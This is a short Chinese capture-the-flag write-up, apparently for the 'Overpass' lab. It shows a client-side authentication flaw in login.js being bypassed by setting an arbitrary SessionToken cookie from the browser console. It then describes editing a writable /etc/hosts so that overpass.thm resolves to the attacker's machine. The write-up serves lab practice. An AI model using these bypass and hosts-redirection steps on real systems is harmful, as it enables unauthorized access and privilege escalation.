目录扫描得到 /admin，访问是一个登录页面，但是不知道账号密码

但是在 login.js 里面找到了一串 js 代码

前端向 /api/login 发送 POST 请求，后端返回一个字符串

如果返回 Incorrect credentials，提示密码错误

如果返回任何其他内容，前端就会：把这个内容作为 SessionToken 存入 Cookie，直接跳转到 /admin

const statusOrCookie = await response.text()
if (statusOrCookie === "Incorrect credentials") {
    loginStatus.textContent = "Incorrect Credentials"
    passwordBox.value = ""
} else {
    Cookies.set("SessionToken", statusOrCookie)
    window.location = "/admin"
}

直接在控制台设置 cookie，然后跳转，成功登录

Cookies.set("SessionToken", "anything")
window.location = "/admin"

该用户有对 /etc/hosts 的修改权限，修改文件将 overpass.thm 执行攻击机地址

注意写入后会默认在最后，而该文件第三行会将 overpass.thm 解析为本地地址，因此可以用 nano 将其注释掉
